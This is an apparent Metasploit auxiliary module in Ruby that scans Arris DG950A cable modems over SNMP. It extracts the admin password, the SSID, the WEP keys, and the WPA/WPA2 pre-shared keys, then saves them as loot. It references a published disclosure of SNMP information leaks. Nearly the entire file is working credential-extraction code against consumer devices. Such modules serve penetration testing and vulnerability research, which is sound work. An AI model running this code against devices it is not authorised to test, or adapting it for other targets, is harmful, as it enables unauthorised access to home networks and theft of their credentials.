#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Arris DG950A Cable Modem Wifi Enumeration',
      'Description' => %q{
        This module will extract WEP keys and WPA preshared keys from
        Arris DG950A cable modems.
      },
      'References'  =>
        [
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/08/21/more-snmp-information-leaks-cve-2014-4862-and-cve-2014-4863']
        ],
      'Author'      => ['Deral "Percent_X" Heiland'],
      'License'     => MSF_LICENSE
    )
  end

  def run_host(ip)
    snmp = connect_snmp

    if snmp.get_value('sysDescr.0') =~ /DG950A/
      print_good("#{ip}")

      # System Admin Password
      wifiinfo = ''
      password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')
      print_good("Password: #{password}")
      wifiinfo << "Password: #{password}" << "\n"

      # check WPA Encryption Algorithm
      encryptalg = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.1.12')
      if encryptalg == '1'
        wpaencrypt = 'TKIP'

      elsif encryptalg == '2'
        wpaencrypt = 'AES'

      elsif encryptalg == '3'
        wpaencrypt = 'TKIP/AES'

      else
        wpaencrypt = 'Unknown'
      end

      # Wifi Status
      wifistatus = snmp.get_value('1.3.6.1.2.1.2.2.1.8.12')
      if wifistatus == '1'
        ssid = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.22.1.2.12')
        print_good("SSID: #{ssid}")
        wifiinfo << "SSID: #{ssid}" << "\n"

        # Wifi Security Settings
        wifiversion = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.22.1.5.12')
        if wifiversion == '0'
          print_line('Open Access Wifi is Enabled')
          wifiinfo << 'Open Access WIFI is Enabled' << '\n'

        # Wep enabled
        elsif wifiversion == '1'
          weptype = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.23.1.2.12')
          if weptype == '1'
            print_good('WEP Key Length: 64BITS ')
            wifiinfo << 'WEP Key Length: 64BITS ' << '\n'
            wepkey1 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.24.1.2.12.1')
            key1 = "#{wepkey1}"
            print_good("WEP KEY1: #{key1}")
            wifiinfo << "WEP KEY1: #{key1}" << "\n"
            wepkey2 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.24.1.2.12.2')
            key2 = "#{wepkey2}"
            print_good("WEP KEY2: #{key2}")
            wifiinfo << "WEP KEY2: #{key2}" << "\n"
            wepkey3 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.24.1.2.12.3')
            key3 = "#{wepkey3}"
            print_good("WEP KEY3: #{key3}")
            wifiinfo << "WEP KEY3: #{key3}" << "\n"
            wepkey4 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.24.1.2.12.4')
            key4 = "#{wepkey4}"
            print_good("WEP KEY4: #{key4}")
            wifiinfo << "WEP KEY4: #{key4}" << "\n"

          elsif weptype == '2'
            print_good('WEP Key Length: 128BITS ')
            wifiinfo << 'WEP Key Length: 128BITS ' << '\n'
            wepkey1 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.25.1.2.12.1')
            key1 = "#{wepkey1}"
            print_good("WEP KEY1: #{key1}")
            wifiinfo << "WEP KEY1: #{key1}" << "\n"
            wepkey2 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.25.1.2.12.2')
            key2 = "#{wepkey2}"
            print_good("WEP KEY2: #{key2}")
            wifiinfo << "WEP KEY2: #{key2}" << "\n"
            wepkey3 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.25.1.2.12.3')
            key3 = "#{wepkey3}"
            print_good("WEP KEY3: #{key3}")
            wifiinfo << "WEP KEY3: #{key3}" << "\n"
            wepkey4 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.25.1.2.12.4')
            key4 = "#{wepkey4}"
            print_good("WEP KEY4: #{key4}")
            wifiinfo << "WEP KEY4: #{key4}" << "\n"

          else
            print_line('FAILED')
          end

        # WPA enabled
        elsif wifiversion == '2'
          wpapsk = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')
          print_good("WPA PSK: #{wpapsk}")
          print_good("WPA Encryption: #{wpaencrypt}")
          wifiinfo << "WPA PSK: #{wpapsk}" << "\n"
          wifiinfo << "WPA Encryption #{wpaencrypt}" << "\n"

        # WPA2 enabled
        elsif wifiversion == '3'
          wpapsk2 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')
          print_good("WPA2 PSK: #{wpapsk2}")
          print_good("WPA2 Encryption: #{wpaencrypt}")
          wifiinfo << "WPA2 PSK: #{wpapsk2}" << "\n"
          wifiinfo << "WPA2 Encryption: #{wpaencrypt}" << "\n"

        # WPA/WPA2 enabled
        elsif wifiversion == '7'
          wpawpa2psk = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')
          print_good("WPA/WPA2 PSK: #{wpawpa2psk}")
          print_good("WPA/WPA2 Encryption: #{wpaencrypt}")
          wifiinfo << "WPA/WPA2 PSK: #{wpawpa2psk}" << "\n"
          wifiinfo << "WPA/WPA2 Encryption: #{wpaencrypt}" << "\n"

        else
          print_line('FAILED')
        end
      else
        print_line('WIFI is not enabled')
      end
    else
      print_line('Does not appear to be an Arris DG950A')
      exit
    end
    # Woot we got loot.
    loot_name     = 'arris_wifi'
    loot_type     = 'text/plain'
    loot_filename = 'arris_wifi.text'
    loot_desc     = 'Arris DG950A Wifi configuration data'
    p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo, loot_filename, loot_desc)
    print_status("WIFI Data saved in: #{p}")
  rescue ::SNMP::UnsupportedVersion
  rescue ::SNMP::RequestTimeout
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue ::Exception => e
    print_error("#{ip} error: #{e.class} #{e}")
    disconnect_snmp
  end
end
